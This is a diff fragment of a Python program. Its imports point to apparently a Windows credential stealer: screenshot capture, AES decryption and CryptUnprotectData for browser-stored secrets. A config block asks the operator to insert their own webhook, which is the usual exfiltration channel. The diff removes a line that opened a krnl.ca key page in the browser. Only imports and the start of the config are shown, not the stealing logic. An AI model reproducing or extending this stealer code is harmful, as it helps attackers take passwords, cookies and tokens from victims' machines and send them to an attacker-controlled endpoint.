@@ -10,7 +10,6 @@ import sqlite3
 import zipfile
 import threading
 import subprocess
-import webbrowser as wb
 
 from sys import argv
 from PIL import ImageGrab
@@ -19,8 +18,6 @@ from tempfile import mkdtemp
 from re import findall, match
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
-
-wb.open('https://cdn.krnl.ca/getkey.php')
 
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓
